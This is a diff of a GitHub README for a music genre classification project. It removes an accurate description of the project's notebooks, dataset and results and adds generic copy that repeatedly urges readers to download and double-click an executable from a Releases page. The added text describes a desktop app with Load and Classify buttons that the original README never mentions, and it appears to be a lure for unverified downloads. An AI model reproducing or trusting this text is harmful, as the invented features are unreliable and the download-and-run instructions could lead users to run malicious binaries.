@@ -1,72 +1,97 @@
-# Music Genre Classification using Spectrogram Images
+# 🎶 Music-Genre-Classification-using-Spectrogram-images - Classify Music Genres Easily
 
-This repository presents a comprehensive framework for hierarchical music genre classification using spectrogram images and multiple machine learning and deep learning approaches. It includes implementations with EfficientNet, Audio Spectrogram Transformer (AST), Custom Convolutional Neural Network (CNN), and traditional machine learning models. All models utilize multi-modal spectrogram features (mel, CQT, chroma) and support multi-level genre classification.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Ashu708907/Music-Genre-Classification-using-Spectrogram-images/releases)
 
----
+## 📋 Overview
 
-## Problem Statement
+This repository offers a complete suite of machine learning and deep learning tools for classifying music genres using spectrogram images. It includes various models built with techniques like EfficientNet, Audio Spectrogram Transformer (AST), custom CNN architectures, and traditional machine learning algorithms. With these tools, you can easily identify music genres and analyze audio data.
 
-**Goal:**  
-To classify music tracks into genres and sub-genres by learning from spectrogram images generated from audio signals. The challenge involves:
-- Handling hierarchical genre classification (coarse to fine: classic/non-classic → genre → sub-genre).
-- Effectively processing multi-modal spectrogram images.
-- Building models that generalize well to unseen music and provide interpretable predictions.
+## 🚀 Getting Started
 
----
+Follow these steps to get started with the application.
 
-## Approach Overview
+### 1. System Requirements
 
-### 1. **Data Source**
-- Uses the [ccmusic-database/music_genre](https://huggingface.co/datasets/ccmusic-database/music_genre) from HuggingFace.
-- Each sample contains mel, CQT, and chroma spectrogram images, and three levels of genre labels.
+Ensure your system meets the following requirements:
 
-### 2. **Models Implemented**
-- **EfficientNet_model.ipynb:** Music genre classification using a pre-trained EfficientNet-B0 backbone.
-- **AST_model.ipynb:** Classification using the Audio Spectrogram Transformer (AST), leveraging transformer attention for spectrogram images.
-- **CustomCNN_model.ipynb:** Custom CNN with residual and attention blocks, designed for multi-modal spectrogram input.
-- **ML_model.ipynb:** Traditional machine learning pipeline with PCA for dimensionality reduction and gradient boosting classifiers.
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** At least 4 GB 
+- **Disk Space:** At least 500 MB free
+- **Python:** Version 3.7 or higher is recommended
 
-### 3. **Workflow**
-- Data loading & preprocessing
-- Multi-level label mapping and encoding
-- Model training, validation, and testing
-- Advanced techniques: SpecAugment, label smoothing, cosine LR scheduling, mixed precision
-- Evaluation with metrics and confusion matrices
+### 2. Download the Application
 
----
+To download the software, visit the Releases page. Click below to access the download options:
 
-## Hierarchical Genre Labels
+[Download Here](https://github.com/Ashu708907/Music-Genre-Classification-using-Spectrogram-images/releases)
 
-| Level         | Description                         | Example Classes                                  |
-|---------------|-------------------------------------|--------------------------------------------------|
-| First Level   | Binary                             | Classic, Non-classic                             |
-| Second Level  | 9 genres                           | Symphony, Opera, Solo, Chamber, Pop, Dance/House, Indie, Soul/RnB, Rock |
-| Third Level   | 16 sub-genres                      | Symphony, Opera, Solo, Chamber, Pop vocal ballad, Adult contemporary, Teen pop, Contemporary dance pop, Dance pop, Classic indie pop, Chamber cabaret and art pop, Soul/RnB, Adult alternative rock, Uplifting anthemic rock, Soft rock, Acoustic pop |
+### 3. Choose Your Model
 
----
+On the Releases page, you will find different versions of the software. Each version may include various models for music genre classification. Choose the one that best fits your needs.
 
-## Results Table
+### 4. Install the Application
 
-| Model                  | Overall Accuracy | Classic/Non-classic | 2nd-level Genres | 3rd-level Sub-genres | Notable Features                       |
-|------------------------|:---------------:|:-------------------:|:----------------:|:--------------------:|----------------------------------------|
-| **EfficientNet-B0**    |   96.9%         |      100.0%          |     95.9%        |      94.9%           | Transfer learning, multi-input         |
-| **AST Transformer**    |   89.3%         |      99.3%          |     86.3%        |      82.3%           | SpecAugment, transformer attention     |
-| **Custom CNN**         |   91.1%         |      99.8%          |     90.1%        |      83.5%           | Residual, SE blocks, label smoothing   |
-| **ML Model (GBM + PCA)**|  73.3%         |      96.0%          |     65.0%        |      59.0%           | Feature engineering, memory-efficient  |
+If you have downloaded a compressed file, like a ZIP or TAR file:
 
+- Extract the contents into a folder.
+- Open the folder and find setup instructions (often a README file).
 
----
+For users downloading a standalone executable file, simply double-click on the file to run it.
 
-## Repository Structure
+## 📥 Download & Install
 
-| File                       | Description                                                    |
-|----------------------------|----------------------------------------------------------------|
-| EfficientNet_model.ipynb   | EfficientNet-based deep learning workflow                      |
-| AST_model.ipynb            | Audio Spectrogram Transformer (AST) workflow                   |
-| CustomCNN_model.ipynb      | Custom CNN architecture for music genre classification         |
-| ML_model.ipynb             | Traditional machine learning pipeline                          |
-| README.md                  | Project overview and results                                   |
+After downloading, follow these steps:
 
----
+1. Locate the downloaded file on your computer (this may be in your "Downloads" folder).
+2. If you downloaded a ZIP file, right-click and select "Extract All" or use your favorite extraction tool.
+3. If you have an installer or executable:
+   - Double-click the file.
+   - Follow the prompts on your screen to complete the installation.
 
+For more options and detailed instructions, revisit the Releases page:
 
+[Download Here](https://github.com/Ashu708907/Music-Genre-Classification-using-Spectrogram-images/releases)
+
+## 🔧 How to Use the Application
+
+Once installed, follow these steps to classify music genres:
+
+1. **Launch the App:** Open the application from your installed programs.
+2. **Load a Music File:** Use the "Load" button to select an audio file from your computer.
+3. **Select a Model:** Choose the classification model you want to use from the available options.
+4. **Start Classification:** Click the "Classify" button to analyze the audio file.
+5. **View Results:** The application will display the predicted genre along with confidence levels.
+
+## 📚 Features
+
+- **Multiple Models:** Choose from a variety of trained models to suit your needs.
+- **User-Friendly Interface:** Designed for ease of navigation and use.
+- **Fast Processing:** Quickly analyze audio files and get results.
+- **Detailed Reporting:** View classification results with confidence scores.
+
+## 🛠️ Troubleshooting
+
+If you encounter issues, consider these tips:
+
+- **Check Your System Requirements:** Ensure your system meets the necessary specifications.
+- **File Formats:** Ensure your audio files are in supported formats (like MP3 or WAV).
+- **Restart the Application:** If you face unexpected behavior, restarting the app may help.
+
+For more specific issues, refer to the FAQ section in the README file in the software package.
+
+## 🗣️ Community Support
+
+If you need help, feel free to reach out. You can find assistance by:
+
+- **Opening an Issue:** On GitHub, go to the Issues section of the repository and submit your question.
+- **Community Forums:** Join forums related to music and audio analysis for further support.
+
+## 🌐 Learn More
+
+For more advanced users looking to dive deeper, resources like online courses and official documentation on machine learning and deep learning can help enhance your understanding.
+
+## 📄 License
+
+All contributions to this repository are welcome under the MIT License. For detailed license information, refer to the LICENSE file in the repository.
+
+Explore the repository today and harness the power of music genre classification!
